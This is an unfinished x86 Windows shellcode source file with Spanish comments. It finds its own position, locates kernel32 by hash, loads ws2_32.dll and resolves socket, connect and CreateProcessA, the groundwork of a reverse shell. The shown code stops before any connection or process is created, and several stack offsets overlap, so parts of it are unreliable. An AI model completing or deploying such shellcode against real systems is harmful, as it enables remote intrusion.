[BITS 32]

_start:
    call geteip

geteip:
    pop edx
    lea edx, [edx - 5]


; -----------------------------------
; Variables Locales (Stack fame) || [ebp - LABEL]
_EBP equ 0x0
BaseKernel32 equ 0x4
CloseHandle equ 0x8 
CreateProcessA equ 0xC
ExitProcess equ 0x10
LoadLibraryA equ 0x14
TerminateProcess equ 0x18 
WaitForSingleObject equ 0x1c

BaseWs2_32 equ 0x20
WSACleanup equ 0x24
WSASocket equ 0x28
WSAStartup equ 0x2c
closesocket equ 0x30
connect equ 0x34

hSocket equ 0x30        ; size 0x4
wsaData equ 0x34        ; size 0x190
server equ 0x1c4        ; size 0x10
startupinfo equ 0x1d4   ; size 0x44
processinfo equ 0x218   ; size 0x10

; -----------------------------------
; INIT Stack frame
; -----------------------------------
push    ebp        ; guardo ebp del stack frame anterior
mov     ebp, esp    ; inicializo el nuevo
sub     esp, 0x300  ; mejor que sobre

; -----------------------------------
; Obtener base de kernell32.dll
; -----------------------------------
push    edx
mov     eax, [edx + KERNEL32]
push    eax
call    get_module_base
mov     [ebp - BaseKernel32], eax
pop     edx

; -----------------------------------
; runtime_linking - kernell32
; -----------------------------------
push    edx
lea     eax, [ebp - CloseHandle]
push    eax
lea     eax, dword [edx + KERNEL32_DEF_HASHES]
push    eax
mov     eax, dword [ebp - BaseKernel32]
push    eax
call    runtime_linking
pop     edx

; -----------------------------------
; Cargar ws2_32.dll
; -----------------------------------
push    edx
lea     ebx, [edx + WS2_32_STR]
mov     eax, [ebp - LoadLibraryA]
push    ebx
call    eax
mov     [ebp - BaseWs2_32], eax
pop     edx

; -----------------------------------
; runtime_linking - ws2_32.dll
; -----------------------------------
push    edx
lea     eax, [ebp - WSACleanup]
push    eax
lea     eax, dword [edx + WS2_32_DEF_HASHES]
push    eax
mov     eax, dword [ebp - BaseWs2_32]
push    eax
call    runtime_linking
pop     edx




; -----------------------------------
mov esp, ebp    ; limpia la pila
pop ebp         ; restaura el viejo frame pointer
ret             ; vuelve a la dirección de retorno


; -----------------------------------
%include ".\runtime_linking\runtime_linking.asm"
; -----------------------------------

KERNEL32:  dd 0x4b1ffe8e
WS2_32_STR:     db 'ws2_32.dll', 0

KERNEL32_DEF_HASHES:
    dd 0x723EB9D5   ; CloseHandle:          
    dd 0x46718AE6   ; CreateProcessA:       
    dd 0x9590A319   ; ExitProcess:          
    dd 0xC8E88006   ; LoadLibraryA:           
    dd 0x9e6f6842   ; TerminateProcess:       
    dd 0xc547757b   ; WaitForSingleObject:
    dd 0xFFFFFFFF    


WS2_32_DEF_HASHES:
    dd 0xaff835ad   ; WSACleanup:
    dd 0x8b9d756a   ; WSASocket:
    dd 0xed9ef56d   ; WSAStartup:
    dd 0x939d7d9c   ; closesocket:
    dd 0xedd8fe8a   ; connect:
    dd 0xFFFFFFFF
